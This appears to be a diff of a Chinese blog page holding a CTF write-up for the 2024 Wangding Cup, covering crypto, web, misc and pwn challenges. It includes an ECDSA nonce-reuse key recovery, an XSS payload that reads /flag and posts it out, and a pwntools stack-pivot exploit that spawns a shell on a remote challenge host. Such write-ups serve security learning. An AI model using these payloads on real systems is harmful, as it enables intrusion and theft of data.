+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-comment"># Parameters from the original code</span><br>p = <span class="hljs-number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F</span><br>a = <span class="hljs-number">0</span><br>b = <span class="hljs-number">7</span><br>xG = <span class="hljs-number">0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798</span><br>yG = <span class="hljs-number">0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8</span><br>G = (xG, yG)<br>n = <span class="hljs-number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span><br>h = <span class="hljs-number">1</span><br>zero = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># From the provided values</span><br>r1 = <span class="hljs-number">111817653331957669294460466848850458804857945556928458406600106150268654577388</span><br>r2 = <span class="hljs-number">111817653331957669294460466848850458804857945556928458406600106150268654577388</span><br>s1 = <span class="hljs-number">86614391420642776223990568523561232627667766343605236785504627521619587526774</span><br>s2 = <span class="hljs-number">99777373725561160499828739472284705447694429465579067222876023876942075279416</span><br>z1 = <span class="hljs-number">96525870193778873849147733081234547336150390817999790407096946391065286856874</span><br>z2 = <span class="hljs-number">80138688082399628724400273131729065525373481983222188646486307533062536927379</span><br><br><span class="hljs-comment"># Calculate k</span><br>k = (z1 - z2) * gmpy2.invert(s1 - s2, n) % n<br><br><span class="hljs-comment"># Calculate dA</span><br>dA = (s1 * k - z1) * gmpy2.invert(r1, n) % n<br><br><span class="hljs-comment"># Generate AES key</span><br>key = sha256(long_to_bytes(dA)).digest()<br><br><span class="hljs-comment"># Decrypt the AES-CBC ciphertext</span><br>encrypted_flag_hex = <span class="hljs-string">"6c201c3c4e8b0a2cdd0eca11e7101d45d7b33147d27ad1b9d57e3d1e20c7b3c2e36b8da3142dfd5abe335a604ce7018878b9f157099211a7bbda56ef5285ec0b"</span><br>encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex)<br>iv = encrypted_flag_bytes[:<span class="hljs-number">16</span>]<br>ciphertext = encrypted_flag_bytes[<span class="hljs-number">16</span>:]<br><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>decrypted_flag = unpad(cipher.decrypt(ciphertext), AES.block_size)<br><br><span class="hljs-comment"># Decrypt the Caesar cipher</span><br>victory_key = <span class="hljs-string">"WANGDINGCUP"</span><br>decrypted_flag_text = <span class="hljs-string">""</span><br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> decrypted_flag.decode():<br>    <span class="hljs-keyword">if</span> char.isalpha():<br>        shift = <span class="hljs-built_in">ord</span>(victory_key[<span class="hljs-built_in">len</span>(decrypted_flag_text) % <span class="hljs-built_in">len</span>(victory_key)]) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">"A"</span>)<br>        decrypted_char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(char) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">"A"</span>) - shift) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">"A"</span>))<br>        decrypted_flag_text += decrypted_char<br>    <span class="hljs-keyword">else</span>:<br>        decrypted_flag_text += char<br>lower_flag = decrypted_flag_text.lower()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"Decrypted flag:"</span>, lower_flag)<br><br></code></pre></td></tr></tbody></table></figure>
 <p>运行后得到flag：<code>wdflag{58ae00432d8228c9e3a927bbcd8d67d2}</code></p>
 <h1>Web</h1>
 <h2 id="Web02（By-KeqingMoe）">Web02（By KeqingMoe）</h2>
@@ -471,7 +356,7 @@ from Crypto.Util.number impor">
 <p>在输入框输入一些东西，点更新，更新成功，然后返回，发现下面就多了一行字。</p>
 <p>写一点 html 交上去，发现可以。联系它说的点提交会审核清单，从而想到 XSS 攻击。</p>
 <p>经过简单地猜测，检查到 /flag 下有东西，访问，但得到“你是 boss 嘛？就想看其他无人机拟定执行任务？”从而想到用 xss 把 flag 拿到传回来</p>
-<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">'/flag'</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> data.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> </span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">fetch</span>(<span class="string">'/content/b279d32c6978a402f855956b080bb8a3'</span>, {</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">method</span>: <span class="string">'POST'</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">headers</span>: {</span></span><br><span class="line"><span class="language-javascript">                        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span></span><br><span class="line"><span class="language-javascript">                    },</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">body</span>: <span class="string">`content=<span class="subst">${<span class="built_in">encodeURIComponent</span>(data)}</span>`</span></span></span><br><span class="line"><span class="language-javascript">    			}</span></span><br><span class="line"><span class="language-javascript">			)</span></span><br><span class="line"><span class="language-javascript">		).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> </span></span><br><span class="line"><span class="language-javascript">               <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">'Error: '</span>, error)</span></span><br><span class="line"><span class="language-javascript">               )</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/flag'</span>)</span><br><span class="language-javascript">        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> data.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> </span><br><span class="language-javascript">			<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/content/b279d32c6978a402f855956b080bb8a3'</span>, {</span><br><span class="language-javascript">                    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">headers</span>: {</span><br><span class="language-javascript">                        <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/x-www-form-urlencoded'</span></span><br><span class="language-javascript">                    },</span><br><span class="language-javascript">                    <span class="hljs-attr">body</span>: <span class="hljs-string">`content=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(data)}</span>`</span></span><br><span class="language-javascript">    			}</span><br><span class="language-javascript">			)</span><br><span class="language-javascript">		).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> </span><br><span class="language-javascript">               <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Error: '</span>, error)</span><br><span class="language-javascript">               )</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure>
 <p><img src="https://assets.bili33.top/img/CTF-Wangding2024-Qinglong-Preliminary-round-Writeup/A9spdp6_1x8bumr_h4g.png" alt=""></p>
 <p>从而拿到 flag 是 wdflag{z0b2pvf3fk1d77rks6a4y6fs5chn6sqh}</p>
 <h1>MISC</h1>
@@ -488,7 +373,7 @@ from Crypto.Util.number impor">
 <p>图形很扭曲，并且似乎有规律可循。根据它的形状，想到 Peano 分形曲线</p>
 <p><img src="https://assets.bili33.top/img/CTF-Wangding2024-Qinglong-Preliminary-round-Writeup/A93mbxwx_1x8bulo_h4g.png" alt=""></p>
 <p>搜索到一篇 IrisCTF2024 上的题目，也是 Peano 分形曲线处理过的图片的题，参考后得到如下代码：</p>
-<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">peano</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [[<span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        in_lst = peano(n - <span class="number">1</span>)</span><br><span class="line">        lst = in_lst.copy()</span><br><span class="line">        px, py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px, py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px, py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + <span class="number">1</span> + i[<span class="number">0</span>], py + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px, py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py - <span class="number">1</span> - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px, py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py - <span class="number">1</span> - i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px, py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + <span class="number">1</span> + i[<span class="number">0</span>], py + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px, py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px - i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        px, py = lst[-<span class="number">1</span>]</span><br><span class="line">        lst.extend([px + i[<span class="number">0</span>], py + <span class="number">1</span> + i[<span class="number">1</span>]] <span class="keyword">for</span> i <span class="keyword">in</span> in_lst)</span><br><span class="line">        <span class="keyword">return</span> lst</span><br><span class="line"></span><br><span class="line">order = peano(<span class="number">6</span>)</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">"r.png"</span>)</span><br><span class="line">width, height = img.size</span><br><span class="line">block_width = width</span><br><span class="line">block_height = height</span><br><span class="line">new_image = Image.new(<span class="string">"RGB"</span>, (width, height))</span><br><span class="line"><span class="keyword">for</span> i, (x, y) <span class="keyword">in</span> tqdm(<span class="built_in">enumerate</span>(order)):</span><br><span class="line">    new_x, new_y = i % width, i // width</span><br><span class="line">    pixel = img.getpixel((x, height - <span class="number">1</span> - y))</span><br><span class="line">    new_image.putpixel((new_x, new_y), pixel)</span><br><span class="line">new_image.save(<span class="string">"rr.jpg"</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">peano</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> [[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]<br>    <span class="hljs-keyword">else</span>:<br>        in_lst = peano(n - <span class="hljs-number">1</span>)<br>        lst = in_lst.copy()<br>        px, py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px + i[<span class="hljs-number">0</span>], py + <span class="hljs-number">1</span> + i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px, py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px + i[<span class="hljs-number">0</span>], py + <span class="hljs-number">1</span> + i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px, py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px + <span class="hljs-number">1</span> + i[<span class="hljs-number">0</span>], py + i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px, py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px - i[<span class="hljs-number">0</span>], py - <span class="hljs-number">1</span> - i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px, py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px + i[<span class="hljs-number">0</span>], py - <span class="hljs-number">1</span> - i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px, py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px + <span class="hljs-number">1</span> + i[<span class="hljs-number">0</span>], py + i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px, py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px - i[<span class="hljs-number">0</span>], py + <span class="hljs-number">1</span> + i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        px, py = lst[-<span class="hljs-number">1</span>]<br>        lst.extend([px + i[<span class="hljs-number">0</span>], py + <span class="hljs-number">1</span> + i[<span class="hljs-number">1</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> in_lst)<br>        <span class="hljs-keyword">return</span> lst<br><br>order = peano(<span class="hljs-number">6</span>)<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">"r.png"</span>)<br>width, height = img.size<br>block_width = width<br>block_height = height<br>new_image = Image.new(<span class="hljs-string">"RGB"</span>, (width, height))<br><span class="hljs-keyword">for</span> i, (x, y) <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">enumerate</span>(order)):<br>    new_x, new_y = i % width, i // width<br>    pixel = img.getpixel((x, height - <span class="hljs-number">1</span> - y))<br>    new_image.putpixel((new_x, new_y), pixel)<br>new_image.save(<span class="hljs-string">"rr.jpg"</span>)<br><br></code></pre></td></tr></tbody></table></figure>
 <p>处理后，得到一张图片，是一个二维码</p>
 <p><img src="https://assets.bili33.top/img/CTF-Wangding2024-Qinglong-Preliminary-round-Writeup/A91ofgzv6_1x8bulw_h4g.png" alt=""></p>
 <p>扫了得到 <code>wdflag{dde235fa-114d-404c-8add-6007e6efabfd}</code></p>
@@ -499,7 +384,7 @@ from Crypto.Util.number impor">
 <p>vuln函数存在栈溢出漏洞</p>
 <p>发现后门函数<code>gift</code>, 字符串<code>/bin/sh</code></p>
 <p>编写利用脚本 getshell</p>
-<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">  context.log_level=<span class="string">'debug'</span></span><br><span class="line">  context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">  ELFpath = <span class="string">'./short'</span></span><br><span class="line">  e = ELF(ELFpath)</span><br><span class="line">  <span class="comment"># p = process(ELFpath)</span></span><br><span class="line">  p = remote(<span class="string">'0192d781680b7e11bd1fe073f5e5923d.el7z.dg10.ciihw.cn'</span>, <span class="number">46319</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'username: '</span>, <span class="string">'admin'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'password: '</span>, <span class="string">'admin123'</span>)</span><br><span class="line"></span><br><span class="line">  buf = <span class="built_in">int</span>(p.recvline_startswith(<span class="string">'You will input this: '</span>).decode()[<span class="number">21</span>:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span> (<span class="string">f'buf:<span class="subst">{<span class="built_in">hex</span>(buf)}</span>\n'</span>)</span><br><span class="line">  vuln = e.symbols[<span class="string">'vuln'</span>]</span><br><span class="line">  gift = e.symbols[<span class="string">'gift'</span>]</span><br><span class="line"></span><br><span class="line">  bin_sh = <span class="number">0x0804A038</span></span><br><span class="line">  leave = <span class="number">0x08048555</span></span><br><span class="line">  offset = <span class="number">0x50</span> - <span class="number">0x4</span>*<span class="number">4</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># gdb.attach(p)</span></span><br><span class="line">  <span class="built_in">print</span> (<span class="string">f'vuln:<span class="subst">{<span class="built_in">hex</span>(vuln)}</span> gift:<span class="subst">{<span class="built_in">hex</span>(gift)}</span>'</span>)</span><br><span class="line"></span><br><span class="line">  payload = <span class="string">b'aaaa'</span>+p32(gift)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">  p.sendafter(<span class="string">'plz input your msg:'</span>, payload + cyclic(offset) +p32(buf) + p32(leave))</span><br><span class="line">  <span class="comment"># p.sendafter('plz input your msg:', b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae')</span></span><br><span class="line">  </span><br><span class="line">  p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  exp()</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>  context.log_level=<span class="hljs-string">'debug'</span><br>  context(arch=<span class="hljs-string">'i386'</span>, os=<span class="hljs-string">'linux'</span>)<br><br>  ELFpath = <span class="hljs-string">'./short'</span><br>  e = ELF(ELFpath)<br>  <span class="hljs-comment"># p = process(ELFpath)</span><br>  p = remote(<span class="hljs-string">'0192d781680b7e11bd1fe073f5e5923d.el7z.dg10.ciihw.cn'</span>, <span class="hljs-number">46319</span>)<br>  p.sendlineafter(<span class="hljs-string">'username: '</span>, <span class="hljs-string">'admin'</span>)<br>  p.sendlineafter(<span class="hljs-string">'password: '</span>, <span class="hljs-string">'admin123'</span>)<br><br>  buf = <span class="hljs-built_in">int</span>(p.recvline_startswith(<span class="hljs-string">'You will input this: '</span>).decode()[<span class="hljs-number">21</span>:], <span class="hljs-number">16</span>)<br><br>  <span class="hljs-built_in">print</span> (<span class="hljs-string">f'buf:<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(buf)}</span>\n'</span>)<br>  vuln = e.symbols[<span class="hljs-string">'vuln'</span>]<br>  gift = e.symbols[<span class="hljs-string">'gift'</span>]<br><br>  bin_sh = <span class="hljs-number">0x0804A038</span><br>  leave = <span class="hljs-number">0x08048555</span><br>  offset = <span class="hljs-number">0x50</span> - <span class="hljs-number">0x4</span>*<span class="hljs-number">4</span><br><br>  <span class="hljs-comment"># gdb.attach(p)</span><br>  <span class="hljs-built_in">print</span> (<span class="hljs-string">f'vuln:<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(vuln)}</span> gift:<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(gift)}</span>'</span>)<br><br>  payload = <span class="hljs-string">b'aaaa'</span>+p32(gift)+p32(<span class="hljs-number">0</span>)+p32(bin_sh)<br><br>  p.sendafter(<span class="hljs-string">'plz input your msg:'</span>, payload + cyclic(offset) +p32(buf) + p32(leave))<br>  <span class="hljs-comment"># p.sendafter('plz input your msg:', b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae')</span><br>  <br>  p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>  exp()<br></code></pre></td></tr></tbody></table></figure>
 <blockquote>
 <p>wdflag{r6kghxuwgu60zb4q1rvp5943zak91ygf}</p>
 </blockquote>
@@ -519,666 +404,207 @@ from Crypto.Util.number impor">
 <p>最后把四个部分拼起来得到 flag: <code>wdflag{9e855bae8f9aaafe9a2eb2cbd8823519}</code></p>
 <p><strong>本篇文章由队长Luminoria编写</strong></p>
 
-                
-            </div>
-            <hr/>
-
-            
-
-    <div class="reprint" id="reprint-statement">
-        
-            <div class="reprint__author">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-user">
-                        文章作者:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jeremiah</a>
-                </span>
-            </div>
-            <div class="reprint__type">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-link">
-                        文章链接:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="http://example.com/2024/11/03/di-si-jie-wang-ding-bei-wang-luo-an-quan-da-sai-qing-long-zu-chu-sai-writeup-zui-hao-noyi-cha-shu-shi-yong-zhe/">http://example.com/2024/11/03/di-si-jie-wang-ding-bei-wang-luo-an-quan-da-sai-qing-long-zu-chu-sai-writeup-zui-hao-noyi-cha-shu-shi-yong-zhe/</a>
-                </span>
-            </div>
-            <div class="reprint__notice">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-copyright">
-                        版权声明:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
-                    许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jeremiah</a>
-                    !
-                </span>
-            </div>
-        
-    </div>
-
-    <script async defer>
-      document.addEventListener("copy", function (e) {
-        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
-        M.toast({html: toastHTML})
-      });
-
-      function navToReprintStatement() {
-        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
-      }
-    </script>
-
-
-
-            <div class="tag_share" style="display: block;">
-                <div class="post-meta__tag-list" style="display: inline-block;">
-                    
-                        <div class="article-tag">
-                            
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
-                        </div>
-                    
-                </div>
-                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-<div id="article-share">
-
-    
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="/libs/share/js/social-share.min.js"></script>
-    
-
-    
-
+  </div>
+  <div id="gitalk-container"></div>
 </div>
 
-                </div>
-            </div>
-            
-        </div>
-    </div>
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/2024/12/03/adctf/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="ADCTF">
-                        
-                        <span class="card-title">ADCTF</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-12-03
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Re/" class="post-category">
-                                    Re
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2024/10/30/newstarctf2024-re-fang-xiang-wp-hui-zong/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="NewStarCTF2024 Re方向wp汇总">
-                        
-                        <span class="card-title">NewStarCTF2024 Re方向wp汇总</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-10-30
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/CTF-Re-Write-up/" class="post-category">
-                                    CTF Re Write up
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Reverse/">
-                        <span class="chip bg-color">Reverse</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-    </div>
-</article>
-
-</div>
-
-
-
-<!-- 代码块功能依赖 -->
-<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
-
-
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
-
-
-<!-- 代码语言 -->
-
-
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget card" style="background-color: white;">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
-        </div>
-    </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
-    </a>
-</div>
-
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
 <script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
-        });
-
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
-    });
-</script>
-
-    
-
-</main>
-
-
-
-
-    <footer class="page-footer bg-color">
-    
